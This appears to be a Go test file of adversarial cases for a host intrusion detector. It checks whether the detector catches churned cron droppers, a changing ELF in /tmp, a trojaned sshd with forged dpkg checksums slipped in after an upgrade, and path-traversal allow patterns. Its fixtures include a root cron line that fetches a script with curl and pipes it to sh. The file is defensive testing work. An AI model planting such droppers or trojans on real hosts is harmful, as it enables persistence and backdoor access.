package detect

import (
	"fmt"
	"os"
	"path/filepath"
	"testing"
	"time"

	"github.com/Problem99-io/kodeblue/internal/blue/sensors"
)

// ADV1: value churn defeats debounce: cron file rewritten each sweep.
func TestAdvChurnCron(t *testing.T) {
	root, env, _, reg, d := setup(t)
	sweep(t, d, reg, env, ModeLearn)
	var rs []Result
	for i := 0; i < 20; i++ {
		write(t, root, "/etc/cron.d/evil", fmt.Sprintf("* * * * * root curl -s http://203.0.113.9/x | sh # %d\n", i))
		rs = append(rs, sweep(t, d, reg, env, ModeDetect))
	}
	if f := findRule(rs, "persistence.autorun"); f == nil {
		t.Errorf("CHURN BYPASS: cron dropper rewritten every sweep never reported over 20 sweeps")
	}
}

// ADV1b: tmp_exec ELF churned between tmp_exec runs.
func TestAdvChurnTmpExec(t *testing.T) {
	root, env, _, reg, d := slowSetup(t, "tmp_exec")
	sweep(t, d, reg, env, ModeLearn)
	var rs []Result
	for i := 0; i < 20; i++ {
		write(t, root, "/tmp/.x/payload", fmt.Sprintf("\x7fELF\x02\x01\x01 payload %d", i))
		_ = os.Chmod(filepath.Join(root, "/tmp/.x/payload"), 0o755)
		rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
	}
	if f := findRule(rs, "tmp_exec.elf"); f == nil {
		t.Errorf("CHURN BYPASS: ELF in /tmp whose bytes change every sweep never reported over 20 sweeps")
	}
}

// ADV2: tamper inside the window after a real upgrade, before the package
// collector (every 5 sweeps) re-baselines the version.
func TestAdvUpgradeWindow(t *testing.T) {
	root, env, reg, d := pkgSetup(t)
	// pkgSetup's learn sweep used force; registry sweep counter is 1. Next
	// scheduled sweep (#2) does not run "package".
	dpkgHost(t, root, "1:9.6p1-3ubuntu13.5", "sshd security update bytes")
	env.Pkg = sensors.LoadPackageIndex(env)
	var rs []Result
	rs = append(rs, scheduled(t, d, reg, env, ModeDetect)) // upgrade absorbed by integrity
	trojan := "sshd with a backdoor"
	write(t, root, "/usr/sbin/sshd", trojan)
	write(t, root, "/var/lib/dpkg/info/openssh-server.md5sums", md5hex(trojan)+"  usr/sbin/sshd\n")
	env.Pkg = sensors.LoadPackageIndex(env) // sed -i renames -> info dir mtime -> reload
	for i := 0; i < 12; i++ {
		rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
	}
	for _, r := range rs {
		for _, f := range r.New {
			t.Logf("finding: %s %s", f.Rule, f.Title)
		}
	}
	if findRule(rs, "integrity.changed") == nil && findRule(rs, "package.checksums_changed") == nil && findRule(rs, "integrity.package_mismatch") == nil {
		t.Errorf("WINDOW BYPASS: trojan+md5sums planted right after a real upgrade absorbed silently")
	}
}

// ADV3: false positive while apt has unpacked but not yet configured the
// package for more than one sweep (or it sits in triggers-pending).
func TestAdvUnpackedFP(t *testing.T) {
	for _, st := range []string{"install ok unpacked", "install ok triggers-pending", "install ok half-configured"} {
		t.Run(st, func(t *testing.T) {
			root, env, reg, d := pkgSetup(t)
			newb := "sshd security update bytes"
			write(t, root, "/usr/sbin/sshd", newb)
			write(t, root, "/var/lib/dpkg/status", "Package: openssh-server\nStatus: "+st+"\nVersion: 1:9.6p1-3ubuntu13.5\n\n")
			write(t, root, "/var/lib/dpkg/info/openssh-server.md5sums", md5hex(newb)+"  usr/sbin/sshd\n")
			write(t, root, "/var/log/dpkg.log", time.Now().Add(-time.Minute).Format("2006-01-02 15:04:05")+" upgrade openssh-server:amd64 1:9.6p1-3ubuntu13 1:9.6p1-3ubuntu13.5\n")
			env.Pkg = sensors.LoadPackageIndex(env)
			var rs []Result
			for i := 0; i < 2; i++ { // two sweeps (2 min at default 60s) mid-transaction
				rs = append(rs, scheduled(t, d, reg, env, ModeDetect))
			}
			if f := findRule(rs, "integrity.changed"); f != nil {
				t.Errorf("FALSE POSITIVE during apt (%s): %s sev=%s", st, f.Title, f.Severity)
			}
		})
	}
}

// ADV4: allow-pattern forms.
func TestAdvAllowPatterns(t *testing.T) {
	root := t.TempDir()
	_ = os.MkdirAll(filepath.Join(root, "/etc/cron.d"), 0o755)
	_ = os.MkdirAll(filepath.Join(root, "/usr/local/bin"), 0o755)
	env := &sensors.Env{Root: root}
	cases := []struct{ pat, key string }{
		{"/*/cron-update", "/etc/cron.d/cron-update"},
		{"/*/kworkerd@root", "/usr/local/bin/kworkerd@root"},
		{"/*/x/../update.sh", "/etc/cron.d/x/../update.sh"},
		{"/etc/cron.d/[a-z]*", "/etc/cron.d/[a-z]evil"},
		{"/etc/cron.d/?*", "/etc/cron.d/evil"},
		{"/etc/cron.d/**", "/etc/cron.d/evil"},
		{"/etc/cron.d/x/../*", "/etc/cron.d/evil"},
		{"/etc/cron.d/{a,b}*", "/etc/cron.d/evil"},
		{"/etc/cron.d/abc*", "/etc/cron.d/abc/../../../tmp/evil"},
		{"tcp/4444/public/*", "tcp/4444/public//dev/shm/x"},
		{" /etc/cron.d/* ", "/etc/cron.d/evil"},
		{"/etc/cron.d/*\n", "/etc/cron.d/evil"},
	}
	for _, c := range cases {
		err := CheckAllowPattern(env, c.pat)
		t.Logf("%-28q accepted=%v matches(%q)=%v err=%v", c.pat, err == nil, c.key, Glob(c.pat, c.key), err)
	}
}
